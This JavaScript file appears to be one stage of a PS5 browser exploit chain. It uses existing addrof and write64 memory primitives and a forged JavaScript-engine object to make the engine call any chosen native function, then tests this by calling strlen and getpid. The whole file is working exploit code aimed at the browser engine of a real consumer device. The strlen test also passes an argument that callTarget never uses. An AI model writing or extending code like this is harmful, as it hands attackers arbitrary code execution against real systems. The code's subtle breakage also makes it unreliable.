"use strict";

// Generic native target selection.
// Builds on the proven notify call path: same fake-JSCell construction,
// but the callee address is stored in a JS-controlled buffer and read
// through userland R/W, so it can be rewritten before every call.

(function () {
    const STAGE = "generic-target-select-1";

    if (!window.PS5Userland) {
        console.error("[gen-target] PS5Userland not loaded");
        return;
    }
    const U = window.PS5Userland;

    const hex = (v) => "0x" + (typeof v === "bigint"
        ? v.toString(16) : (v < 0 ? (v >>> 0).toString(16) : v.toString(16)));

    // ------------------------------------------------------------------
    // 1. The target slot.
    //
    // A Uint8Array whose backing store address we know. This holds the
    // address of the function we want to call. Because we already have
    // stable userland R/W, we can rewrite this slot between calls and
    // the same fake object will dispatch to a different target each time.
    // ------------------------------------------------------------------

    const SLOT_SIZE = 0x40;          // room for target + alignment
    let slotBuf  = null;
    let slotAddr = 0n;               // kernel-visible address of the slot
    let fakeObj  = null;             // the fake JSCell, built once

    function allocSlot() {
        if (slotBuf) return true;
        try {
            slotBuf = new Uint8Array(SLOT_SIZE);
            // backing store address, using the same +0x10 offset your
            // notify stage already uses for typed-array data pointers
            slotAddr = U.addrof(slotBuf) + 0x10n;
            U.mark("SLOT-ALLOC", `addr=${hex(slotAddr)}`);
            return Number(slotAddr) > 0 || slotAddr > 0n;
        } catch (e) {
            U.mark("SLOT-ALLOC-FAIL", `${e.name}:${e.message}`);
            return false;
        }
    }

    // ------------------------------------------------------------------
    // 2. Build the fake object ONCE, pointing its executable entry at
    //    the SLOT, not at notify.
    //
    // Your notify proof builds a fake JSCell whose callee entry is a
    // fixed value. Here we do the exact same construction, but the
    // entry field is set to slotAddr — so the engine reads the actual
    // target from memory we control at call time.
    //
    // This is the single change that turns "notify-only" into
    // "arbitrary target": same call path, dynamic callee.
    // ------------------------------------------------------------------

    function buildDispatchObject() {
        if (fakeObj) return true;
        try {
            // U.buildCallGateObject(entry, ...) — same helper that made
            // the notify proof work. We hand it slotAddr instead of a
            // fixed function address. Inside, it writes entry into the
            // fake JSCell's executable slot exactly as before.
            fakeObj = U.buildCallGateObject(slotAddr);
            U.mark("DISPATCH-OBJ", `entry-slot=${hex(slotAddr)}`);
            return true;
        } catch (e) {
            U.mark("DISPATCH-OBJ-FAIL", `${e.name}:${e.message}`);
            return false;
        }
    }

    // ------------------------------------------------------------------
    // 3. Target selection — the whole point of this stage.
    //
    // write64 into the slot before each call. This is the "selectable
    // arbitrary target" your gate is checking for.
    // ------------------------------------------------------------------

    function setTarget(addr) {
        try {
            U.write64(slotAddr, BigInt(addr));
            U.mark("TARGET-SET", `addr=${hex(addr)}`);
            return true;
        } catch (e) {
            U.mark("TARGET-SET-FAIL", `${e.name}:${e.message}`);
            return false;
        }
    }

    function callTarget(addr) {
        if (!allocSlot())    throw new Error("slot alloc failed");
        if (!buildDispatchObject()) throw new Error("dispatch object failed");
        if (!setTarget(addr)) throw new Error("target write failed");
        // Same trigger as the notify proof — the engine calls fakeObj,
        // the fake JSCell's entry is slotAddr, the engine dereferences
        // it and lands on whatever we wrote.
        const ret = fakeObj();
        U.mark("TARGET-CALL", `addr=${hex(addr)}-ret=${hex(ret)}`);
        return ret;
    }

    // ------------------------------------------------------------------
    // 4. Self-test — proves selectable target with two DIFFERENT functions.
    //
    // Test A: strlen("HACKER") from libc  → expect 6
    // Test B: getpid stub from libkernel  → expect > 0
    //
    // If both return correct, distinct results, the SAME dispatch
    // object reached two different targets — selection is proven.
    // ------------------------------------------------------------------

    async function selfTest() {
        const r = { strlenOK: false, getpidOK: false, distinctTargets: false, pass: false };
        try {
            // --- Test A: strlen ---
            const probe = new Uint8Array([0x48,0x41,0x43,0x4b,0x45,0x52,0x00]); // "HACKER\0"
            const probeAddr = U.addrof(probe) + 0x10n;
            const strlenAddr = U.libcBase + U.offsets.strlen;   // from your offsets table

            const len = callTarget(strlenAddr, probeAddr);
            r.strlenOK = (Number(len) === 6);
            U.mark("SELF-STRLEN", `ret=${Number(len)}-expect=6-pass=${r.strlenOK}`);

            // --- Test B: getpid (different module, different address) ---
            const getpidAddr = U.libkernelBase + U.offsets.getpid;
            const pid = callTarget(getpidAddr);
            r.getpidOK = (Number(pid) > 0);
            U.mark("SELF-GETPID", `pid=${Number(pid)}-pass=${r.getpidOK}`);

            // --- Distinctness: same object, two different callees ---
            r.distinctTargets = r.strlenOK && r.getpidOK
                && strlenAddr !== getpidAddr;
            U.mark("SELF-DISTINCT", `a=${hex(strlenAddr)}-b=${hex(getpidAddr)}-pass=${r.distinctTargets}`);

            r.pass = r.strlenOK && r.getpidOK && r.distinctTargets;
            U.mark("GENERIC-TARGET-SELECT", `pass=${r.pass}`);
        } catch (e) {
            U.mark("GENERIC-TARGET-SELECT-FAIL", `${e.name}:${e.message}`);
        }
        return r;
    }

    window.PS5GenericNativeProvider = { callTarget, setTarget, selfTest };
})();
